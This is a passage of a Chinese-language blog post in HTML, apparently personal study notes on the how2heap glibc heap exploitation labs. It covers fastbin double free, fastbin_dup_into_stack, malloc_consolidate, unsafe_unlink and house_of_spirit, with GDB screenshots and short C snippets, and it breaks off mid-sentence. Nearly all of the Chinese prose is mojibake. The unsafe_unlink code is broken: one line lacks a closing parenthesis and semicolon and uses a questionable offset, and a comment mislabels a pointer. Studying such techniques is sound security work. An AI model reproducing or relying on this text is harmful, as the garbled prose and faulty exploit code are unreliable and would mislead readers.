    <content type="html"><![CDATA[<p>è¿˜æ˜¯å¥½å¥½æ‰“åŸºç¡€Â·Â·Â·</p><span id="more"></span><p>ä»¥å‰éƒ½æ˜¯ç›´æ¥æ‹¿é¢˜æ¥ï¼Œç¢°åˆ°çŸ¥è¯†ç‚¹å°±å»å­¦ã€‚ç„¶åç¢°ä¸€é“é¢˜ä¸€é“é¢˜ä¸ä¼šï¼Œæ‰€ä»¥å°±æ¥ç³»ç»Ÿçš„å­¦ä¸€ä¸‹ how2heap</p><blockquote><ul><li>è¿™ä¸ªå®éªŒå¦‚æœè¦åšçš„è¯å»ºè®®å…ˆçœ‹ä¸€ä¸‹ malloc çš„æºç ï¼Œæˆ‘å°±æ˜¯ä¸€å¼€å§‹æ ¹æœ¬ä¸æ‡‚æ¯ä¸€æ­¥çš„åŸç†ï¼Œåˆ†æå®Œæºç ä»¥åè±ç„¶å¼€æœ—äº†ğŸ¿</li><li>æˆ‘ç”¨æ¥ç¼–è¯‘å®éªŒç”¨ä¾‹çš„ä»£ç æ˜¯<a href="https://wiki.wgpsec.org/knowledge/ctf/how2heap.html">ã€PWNã€‘how2heap | ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“ (wgpsec.org)</a></li></ul></blockquote><h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p><strong>åŸç†ï¼š</strong> fastbins çš„ double-free æ”»å‡»</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><ul><li>fast bins ä¸ºå•é“¾è¡¨å­˜å‚¨ï¼Œå¹¶é‡‡ç”¨åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„åŸåˆ™ï¼šå free çš„ chunk ä¼šè¢«æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œä¹Ÿå°±æ˜¯å free çš„ chunk æ°¸è¿œåœ¨å…ˆ free çš„ chunk çš„åé¢ã€‚åç»­ malloc æ—¶ä¼šå…ˆå–å‡ºé“¾è¡¨å°¾åé¢çš„å †å—ï¼Œä¹Ÿå°±æ˜¯æœ€åæ”¾è¿›å»çš„é‚£ä¸ªã€‚</li><li>fastbin çš„ double free æ£€æŸ¥æ˜¯ï¼šå¦‚æœè¦ free æ‰çš„è¿™ä¸ª chunkï¼ˆæˆ‘ä»¬è®°ä½œchunk-Aï¼‰ å±äº fast binï¼Œå°±ä¼šæ£€æŸ¥é“¾è¡¨ä¸­å½“å‰æœ€åä¸€ä¸ªåœ°å€æ˜¯ä¸æ˜¯å³å°†è¦é‡Šæ”¾çš„ chunk-A çš„åœ°å€ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¼šæ‰§è¡Œfree chunkçš„æ“ä½œï¼Œå°† chunk-A çš„åœ°å€é“¾æ¥åˆ°é“¾è¡¨æœ«ç«¯ã€‚</li><li>æˆ‘ä»¬åªè¦ä¿è¯ fast bins é“¾è¡¨æœ€åä¸€ä¸ªåœ°å€ä¸æŒ‡å‘ chunk-A ï¼Œå°±å¯ä»¥å¤šæ¬¡ free chunk-Aï¼Œä»è€Œå®ç° double freeã€‚</li></ul><p><strong>GDB è°ƒè¯•</strong></p><p>å®ä¾‹åšäº†ä¸‹é¢çš„å‡ ä¸ªæ“ä½œï¼š</p><ul><li>malloc ä¸‰ä¸ªå †å—ï¼ˆæˆ‘ä»¬æš‚æ—¶è®°ä¸º1ï¼Œ2ï¼Œ3ï¼‰</li><li>free 1</li><li>free 2</li><li>å†æ¬¡ free 1</li><li>å†æ¬¡ malloc ä¸‰ä¸ªå †å—</li></ul><p>æˆ‘ä»¬å…ˆè®©ç¨‹åºåˆ†é…å¥½ä¸‰ä¸ªå †å—</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_heap1.png"></p><p>æ¥ç€ free æ‰ç¬¬ä¸€ä¸ªå †å—ï¼Œå®ƒä¼šè¿›å…¥åˆ° fastbin ä¸­</p><p>è¿™æ—¶æˆ‘ä»¬å†æ¬¡ <code>free (a)</code> ä¸€æ¬¡ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºå®ƒå·²ç»è¢«é‡Šæ”¾ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ free é“¾è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚</p><p>é‚£æˆ‘ä»¬è¯¥å¦‚ä½•å»ç»•è¿‡è¿™ä¸ªæ£€æµ‹å‘¢ï¼Ÿæ¥ä¸‹æ¥ç¨‹åº <code>free(b)</code> ï¼Œè¿™æ—¶ free é“¾è¡¨ç¬¬ä¸€å°±æ˜¯ b ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†æ¬¡ <code>free (a)</code> äº†</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_free1.png" alt="åœ°å€ä¸ä¸€æ ·äº†å› ä¸ºæˆ‘å‘ç°æˆ‘åŸæœ¬ç”¨çš„æ˜¯2.31æ¢äº†ä¸€ä¸‹"></p><p>free(a) ä¹‹å fastbin é“¾è¡¨å°±å˜æˆäº†ä¸€ä¸ªâ€œç¯å½¢â€ï¼Œè¿™æ—¶ free é“¾è¡¨è®¤ä¸ºå®ƒæœ‰ä¸‰å—å†…å­˜ <code>[0x602000, 0x602020, 0x602000]</code> </p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_free2.png"></p><p>è¿™æ ·çš„è¯æˆ‘ä»¬å†æ¬¡ malloc ç›¸åŒå¤§å°çš„å †å—ï¼Œè¿™ä¸ª <code>0x602020</code>  å°±ä¼šè¢«åˆ†é…ä¸¤æ¬¡ã€‚æˆ‘ä»¬å‘é‡Œé¢å¡«å……æ•°æ®å¯ä»¥çœ‹åˆ°0x4444444444444444 è¢«æ”¹æˆäº† 0x4646464646464646ï¼Œæ˜¯å› ä¸ºåæ¥ç”³è¯·çš„ f è·Ÿ d æŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_heap2.png"></p><p><strong>æ€»ç»“ï¼š</strong></p><p>fastbins çš„ double-free æ”»å‡»ï¼Œå¯ä»¥æ³„éœ²å‡ºä¸€å—å·²ç»è¢«åˆ†é…çš„å†…å­˜æŒ‡é’ˆã€‚</p><p>ç”±äº free çš„è¿‡ç¨‹ä¼šå¯¹ free list åšæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¸èƒ½è¿ç»­ä¸¤æ¬¡ free åŒä¸€ä¸ª chunk ã€‚æ‰€ä»¥åœ¨ä¸¤æ¬¡ free ä¹‹é—´ï¼Œæˆ‘ä»¬åªéœ€è¦å¢åŠ ä¸€æ¬¡å¯¹å…¶ä»– chunk çš„ free è¿‡ç¨‹ï¼Œå°±å¯ä»¥ç»•è¿‡æ£€æŸ¥é¡ºåˆ©æ‰§è¡Œï¼Œè¿™æ ·åŒä¸€ä¸ªåœ°å€å°±ä¼šåœ¨ fast bin é“¾è¡¨ä¸­å‡ºç°ä¸¤æ¬¡ã€‚éšåæˆ‘ä»¬å† malloc ä¸‰æ¬¡ï¼Œå°±åœ¨åŒä¸€ä¸ªåœ°å€ malloc äº†ä¸¤æ¬¡ï¼Œä¹Ÿå°±æœ‰äº†ä¸¤ä¸ªæŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆã€‚</p><h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p><strong>åŸç†ï¼š</strong> è¿™ä¸ªç¨‹åºå±•ç¤ºäº†æ€æ ·é€šè¿‡ä¿®æ”¹ <code>fd</code> æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„ free chunkï¼Œå¹¶åœ¨ä¼ªé€ çš„åœ°å€å¤„ malloc å‡ºä¸€ä¸ª chunk</p><p>å‰é¢çš„éƒ¨åˆ†å’Œä¸Šä¸€ä¸ªå®éªŒä¸€æ ·ï¼Œå…ˆ malloc ä¸‰æ¬¡ç„¶å free ä¸‰æ¬¡ï¼Œè¿™æ—¶ fastbins å½¢æˆäº†ä¸€ä¸ªå¾ªç¯çš„æŒ‡é’ˆã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_list.png"></p><p>è¿™æ—¶æˆ‘ä»¬å† malloc ä¸¤æ¬¡ï¼Œfastbins ä¸­è¿˜å‰©åŸæœ¬æŒ‡å‘ chunk a çš„æŒ‡é’ˆã€‚è€Œå‰ä¸¤æ¬¡ malloc æˆ‘ä»¬å·²ç»ç”³è¯·åˆ°äº†åŒæ ·æŒ‡å‘ <code>a</code> çš„æŒ‡é’ˆ <code>d</code></p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬æŸ¥çœ‹å…¶å†…å­˜åˆ†å¸ƒå‘ç°å®ƒçš„ fd æŒ‡é’ˆæŒ‡å‘ <code>0x603020</code></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_fd.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹å®ƒçš„ fd æŒ‡é’ˆï¼Œè¦†ç›– d çš„å‰å…«ä¸ªå­—èŠ‚ï¼ˆä¹‹å‰æœ‰è¯´è¿‡ï¼Œchunk è¢«ä½¿ç”¨æ—¶ï¼Œå®ƒçš„ <code>fd</code> åŸŸä¹Ÿä¼šè¢«ç”¨æ¥å­˜å‚¨ä¿¡æ¯ï¼‰ ã€‚</p><p><code>stack_var = 0x20; d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code> </p><p>éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬å®šä¹‰è¿™ä¸ª <code>stack_var</code> ï¼Œæ˜¯ä¸ºäº†å–æ ˆä¸Šçš„åœ°å€ï¼Œ<code>æ ˆä¸Šç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€-8</code> å°±æ˜¯æ ˆçš„åŸºå€ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_fd2.png"></p><p>è¿™ä¸ªæ—¶å€™ fd å°±è¢«ä¿®æ”¹ä¸ºæ ˆä¸Šçš„åœ°å€ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_heap2.png"></p><p>åˆå› ä¸º fastbin ä¸­è¿™æ—¶è¿˜æœ‰ä¸€ä¸ª a çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å†è¿›è¡Œä¸¤æ¬¡ mallocï¼Œç¬¬ä¸€æ¬¡ malloc æŠŠ double free çš„ a ç”³è¯·æ‰ï¼Œç¬¬äºŒæ¬¡ malloc å°±ä¼šå»ç”³è¯·è¿™ä¸ªæ ˆä¸Šçš„åœ°å€ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ ˆä¸Šçš„â€œå †å—â€è®°ä¸º <code>S</code> ã€‚</p><p>æ¥ä¸‹æ¥ç¨‹åºå‘ S å†™å…¥æ•°æ®ï¼Œå¯ä»¥çœ‹å‡ºå®ƒå·²ç»è¢«æˆ‘ä»¬æ§åˆ¶äº† </p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_stack1.png"></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dup_stack2.png"></p><h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><p><strong>åŸç†ï¼š</strong>ä½¿ç”¨ <code>malloc_consolidate</code> æœºåˆ¶æ¥ç»•å¼€ fastbin å¯¹ double free çš„æ£€æµ‹ã€‚</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><ul><li><code>malloc_consolidate()</code> å‡½æ•°ç”¨äºå°† fast bins ä¸­çš„ chunk ä¸å…¶ç‰©ç†ç›¸é‚»çš„ chunk åˆå¹¶ï¼Œå¹¶åŠ å…¥ unsorted bin ä¸­ã€‚åˆ†ä¸ºé«˜åœ°å€ï¼ˆé™¤top chunkï¼‰åˆå¹¶å’Œä½åœ°å€åˆå¹¶ã€‚åˆå¹¶åå°†å½“å‰çš„ chunk æˆ–è€… next_chunk ä»å…¶æ‰€åœ¨ bin ä¸­ unlink å‡ºæ¥ã€‚</li></ul><p><strong>GDB è°ƒè¯•</strong></p><p>æˆ‘ä»¬å…ˆç”³è¯·ä¸¤ä¸ª fastbin å¤§å°çš„ chunk a å’Œ bï¼Œæ¥ç€ free aã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_list.png"></p><p>æˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ª largebin å¤§å°çš„ chunk ï¼Œè¿™æ—¶ç¨‹åºä¼šè°ƒç”¨ <code>malloc_consolidate()</code>ï¼Œå°†åˆšåˆš free çš„ a æ”¾åˆ°  unsorted bin ä¸­ï¼Œç„¶åç»è¿‡ç§ç§æŸ¥æ‰¾éå†ï¼ˆåŸç†è¯¦è§ malloc æºç åˆ†æï¼‰å†ä¸¢è¿› smallbin é‡Œé¢ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_smallbin.png"></p><p>è¿™æ—¶ fastbin é“¾è¡¨ä¸­çš„è¡¨å¤´å°±ä¸æ˜¯ a å•¦ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†ä¸€æ¬¡ free aã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fastbin_dupdup_doublefree.png"></p><p>è¿™æ ·ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ malloc ä¸¤ä¸ªæŒ‡å‘åŒä¸€åœ°å€çš„ chunk äº†ã€‚</p><h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h1><p><strong>åŸç†ï¼š</strong>å®ç°åˆ†é…çš„å†…å­˜é‡Œä¼ªé€  fake chunkï¼Œé€šè¿‡ä¿®æ”¹ P çš„ prev_inuse ä½æ¥æ”¹å˜ fake chunk çš„çŠ¶æ€ã€‚free P æ—¶è°ƒç”¨ <code>unlink</code> æ¥åˆå¹¶ P å’Œ fake chunkï¼ŒP çš„æŒ‡é’ˆä¼šå˜ä¸º <code>P-0x18</code>ã€‚</p><p>unlink é€šå¸¸ç»“åˆå †æº¢å‡ºæ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚é€šè¿‡å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸¤ä¸ªè¿ç»­çš„ chunkï¼Œé€šè¿‡ä¿®æ”¹å‰ä¸€ä¸ª chunk çš„å†…å®¹æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ª chunkï¼Œå®ç°ä¿®æ”¹ç¬¬äºŒä¸ª chunk çš„ fd, bk æŒ‡é’ˆçš„ç›®çš„ã€‚</p><p><strong>æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><ul><li><p>inuse chunk å’Œ free chunk</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/inuse_and_free.png"></p></li><li><p>unlink ï¼šå½“æˆ‘ä»¬è°ƒç”¨ malloc å»ä»ä¸€å—å¤§çš„å †å—ä¸­åˆ‡å‰²å°å †å—æ—¶ä¼šè°ƒç”¨åˆ° <code>unlink</code></p><p>æœ‰ä¸€ä¸ªä¿æŠ¤æ£€æŸ¥æœºåˆ¶ï¼Œåœ¨è§£é“¾æ“ä½œä¹‹å‰ï¼Œé’ˆå¯¹å †å— P è‡ªèº«çš„ fd å’Œ bk æ£€æŸ¥é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œå³åˆ¤æ–­å †å— P çš„å‰ä¸€å— bk çš„æŒ‡é’ˆä»¥åŠåä¸€å— fd çš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ Pï¼Œåä¸€å—å †å—çš„ prev_size æ˜¯å¦ç­‰äºè‡ªèº«çš„ sizeã€‚</p></li></ul><p>é¦–å…ˆç”³è¯·ä¸¤ä¸ª malloc ï¼Œæˆ‘ä»¬çœ‹å†…å­˜ä¸­çš„åˆ†å¸ƒå¦‚ä¸‹</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/safechunk_heap1.png"></p><p>æˆ‘ä»¬è¦å®ç°æ§åˆ¶çš„æ˜¯ chunk 1ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„æŒ‡é’ˆæ˜¯ chunk 0ã€‚</p><p>æˆ‘ä»¬æŠŠè¿™ä¸ª fake chunk è®°ä¸º P ã€‚ <code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å¤„ç†è¿™ä¸ªæ£€æŸ¥ã€‚è¿™ä¸ªæ£€æŸ¥çš„ fd&#x2F;bk æŒ‡é’ˆéƒ½æ˜¯é€šè¿‡ä¸ chunk å¤´éƒ¨çš„ç›¸å¯¹åœ°å€æ¥æŸ¥æ‰¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¨å±€æŒ‡é’ˆ chunk0_ptr æ„é€  fake chunk æ¥ç»•è¿‡å®ƒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¿®æ”¹ chunk0 çš„ä¿¡æ¯ï¼Œåœ¨ chunk0 é‡Œé¢ä¼ªé€ ä¸€ä¸ª fake chunkã€‚è®© fake chunk çš„ fd æŒ‡é’ˆæŒ‡å‘ &amp;chunk0_ptrï¼Œè®© bk æŒ‡é’ˆæŒ‡å‘ &amp;chunk0_ptrï¼Œä½¿å¾— <code>P-&gt;fd-&gt;bk=P,P-&gt;bk-&gt;fd=P</code> ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk.png"></p><p>è¿™æ—¶æˆ‘ä»¬æŸ¥çœ‹ chunk0 çš„å†…å­˜åŒºåŸŸï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä¼ªé€ äº†ä¸€ä¸ª fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆã€‚</p><p>æ¥ä¸‹æ¥åªéœ€è¦æœ‰ä¸€ä¸ªæº¢å‡ºçš„æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ chunk1 çš„ PREV_SIZE ä½å¤§å°ï¼Œå¹¶æŠŠ PREV_INUSE æ ‡å¿—ä½ä¸º 0ã€‚åœ¨æˆ‘ä»¬çš„ç¨‹åºä¸­ï¼Œå¦‚æœæ­£å¸¸çš„  <code>free(chunk0)</code>ï¼Œé‚£ä¹ˆ chunk1 ä¸­çš„ PREV_SIZE ä½æ˜¯ 0x90 ï¼Œæˆ‘ä»¬å°†å®ƒæ”¹ä¸ºä¼ªé€ çš„ fake chunk çš„å¤§å° 0x80ï¼Œå¹¶æŠŠå…¶æ ‡è®°ä¸ºç©ºé—²ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk2.png"></p><blockquote><p>åŸæœ¬ size ä½çš„ 91ä¸­çš„â€œ1â€å®é™…ä¸Šæ˜¯ PREV_inuse ä½</p></blockquote><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬çš„ fake_chunk é‡Œçš„æŒ‡é’ˆæƒ…å†µå¦‚ä¸‹ï¼š</p><ul><li>fd æŒ‡é’ˆæŒ‡å‘ 0x602058 </li><li>bk æŒ‡é’ˆæŒ‡å‘ 0x602060 </li><li>0x602058 çš„ bk æŒ‡å‘ 0x602070</li><li>0x602060 çš„ fd æŒ‡å‘ 0x602070</li></ul><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/unsafe_fakechunk3.png"></p><p>æˆ‘ä»¬ä¿è¯äº†ä¸€ä¸ª fake chunk ä¸æ ˆä¸ŠåŒºåŸŸçš„å®Œæ•´çš„åŒå‘é“¾è¡¨ï¼Œ</p><p>è¿™ä¸‹æˆ‘ä»¬åªè¦ <code>free(1)</code> ï¼Œå› ä¸º chunk1 ä¸å±äº fastbinï¼Œè¿™æ—¶æˆ‘ä»¬åŸæœ¬åœ¨ chunk0 ä¸­çš„ fake chunk å°±ä¼šä¸ chunk1 åˆå¹¶ã€‚åˆå¹¶è¿‡ç¨‹è°ƒç”¨ <code>unlink()</code> å‡½æ•°ï¼Œä¼šå‘ç”Ÿä¸‹é¢çš„å‡ ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬åˆ†åˆ«å°†ä»–ä»¬ç›´æ¥çœ‹åšå…·ä½“çš„å†…å­˜ä½ç½®æ¥çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">FD=P-&gt;fd       <span class="hljs-comment">//     FD = P-&gt;fd = &amp;P - 24</span><br>BK=P-&gt;bk       <span class="hljs-comment">//     BK = P-&gt;bk = &amp;P - 16</span><br>FD-&gt;bk = BK    <span class="hljs-comment">//     FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br>BK-&gt;fd = FD    <span class="hljs-comment">//     FD-&gt;fd = *(&amp;P - 16 + 16) = P</span><br></code></pre></td></tr></table></figure><p>æœ€åå®ç°çš„ç»“æœæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk = P = BK = &amp;P - <span class="hljs-number">16</span><br>BK-&gt;fd = P = FD = &amp;P - <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å‘ç°ï¼Œchunk0_ptr å’Œ chunk0_ptr[3] (fake chunk) æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ chunk0_ptr è¦†ç›–è‡ªèº«æ¥æŒ‡å‘ä»»æ„ä½ç½®äº†ã€‚</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote><p>åˆ°è¿™é‡Œç»ˆäºæ˜¯çœ‹åˆ°ä¸€ä¸ª fastbin çš„å¸¸è§çš„æ”»å‡»æ–¹æ³•äº†ğŸ˜€</p></blockquote><p><strong>åŸç†ï¼š</strong></p><p>House_of_spirit æ˜¯åˆ©ç”¨å †çš„ fast bin æœºåˆ¶æ¥è¾…åŠ©æ ˆæº¢å‡ºçš„ã€‚å¦‚æœæ ˆæº¢å‡ºçš„é•¿åº¦æ— æ³•è¦†ç›–è¿”å›åœ°å€ï¼Œä½†å¯ä»¥è¦†ç›–æ ˆä¸Šçš„ä¸€ä¸ªå³å°†è¢« free çš„å †æŒ‡é’ˆã€‚æ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨æº¢å‡ºæ¥å°†è¿™ä¸ªæŒ‡é’ˆæ”¹å†™ä¸ºæ ˆä¸Šçš„åœ°å€å¹¶åœ¨ç›¸åº”ä½ç½®æ„é€ ä¸€ä¸ª fast bin å—çš„å…ƒæ•°æ®ã€‚æ¥ç€åœ¨ free æ“ä½œæ—¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«æ”¾åˆ° fast bin ä¸­ï¼Œä¸‹ä¸€æ¬¡ malloc å¯¹åº”çš„å¤§å°æ—¶ï¼Œç”±äºfast binçš„å…ˆè¿›åå‡ºæœºåˆ¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«è¿”å›ç»™ç”¨æˆ·ï¼Œå†æ¬¡å†™å…¥æ—¶å°±å¯èƒ½é€ æˆè¿”å›åœ°å€çš„æ”¹å†™ã€‚</p><p><strong>House_of_spirit åˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯æ§åˆ¶ä¿®æ”¹ä¼ ç»™ free å‡½æ•°çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ª fake chunkï¼Œ fake chunk çš„ä¼ªé€ æ˜¯å…³é”®ã€‚</strong></p><p>åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæˆ‘ä»¬çš„ fakechunk æ˜¯æ„å»ºåœ¨æ ˆä¸Šçš„æœ‰10 ä¸ªå…ƒç´ çš„é•¿æ•´å‹æ•°ç»„ï¼Œä¹Ÿå°±å°±æ˜¯é•¿åº¦ä¸º 80 ã€‚è¿™ä¸ªåŒºåŸŸé‡Œæˆ‘ä»¬é¢„è®¡è®¾ç½®ä¸¤ä¸ª fake chunkã€‚</p><p>åœ¨å‡†å¤‡é˜¶æ®µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå°±æ˜¯æ­£å¸¸çš„ä¸€ä¸ªæ ˆä¸Šçš„ç»“æ„ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_fakechunk_init.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ„é€  fake chunkã€‚</p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰é‡Šæ”¾è¿™ä¸ª fake chunk æ‰€ä»¥åªéœ€è¦è®¾ç½® size ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_fakechunk.png"></p><p>åœ¨å¼€å§‹çš„æ—¶å€™æˆ‘ä»¬ç”³è¯·äº†ä¸€ä¸ªchunk *<em>a</em>ï¼Œæˆ‘ä»¬ç°åœ¨å‡è®¾æ ˆæº¢å‡ºä¿®æ”¹äº† <em>*a</em> æŒ‡å‘ fake chunk1 ï¼Œç°åœ¨æˆ‘ä»¬ free æ‰å®ƒ.</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/houseofsprit_free.png"></p><p>è¿™æ—¶æˆ‘ä»¬çš„ fake chunk å°±è¿›å…¥äº† bins 